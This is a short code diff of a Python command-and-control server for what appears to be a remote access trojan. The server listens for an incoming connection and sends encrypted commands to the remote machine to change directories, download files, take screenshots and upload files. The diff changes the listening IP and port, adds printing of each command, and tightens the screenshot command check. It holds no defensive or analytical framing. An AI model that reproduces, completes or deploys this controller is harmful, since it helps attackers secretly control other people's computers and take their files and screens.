@@ -9,7 +9,7 @@ class Server(Thread):
     def __init__(self):
         self.controller = Controller()
         self.conn = socket.socket()
-        self.conn.bind(("10.0.0.10", 8080))
+        self.conn.bind(("10.0.0.19", 9999))
         self.conn.listen(1)
         print('[+] Listening for income TCP connection on port 8080')
         self.conn, addr = self.conn.accept()
@@ -69,6 +69,7 @@ class Server(Thread):
         while True:
             command = input(self.cwd + ' ')
             self.SaveObject(command)
+            print(command)
             if 'cd' in command:
                 self.conn.send(encrypt_server(command.encode('ISO-8859-1')))
                 res = decrypt_server(self.conn.recv(1024)).decode('ISO-8859-1')
@@ -79,7 +80,7 @@ class Server(Thread):
                 self.__init__()
             elif 'grab' in command or 'download' in command:
                 self.download(command)
-            elif 'screenshot' in command:
+            elif 'screenshot' == command:
                 self.download(command)
             elif 'send' in command or 'upload' in command:
                 try:
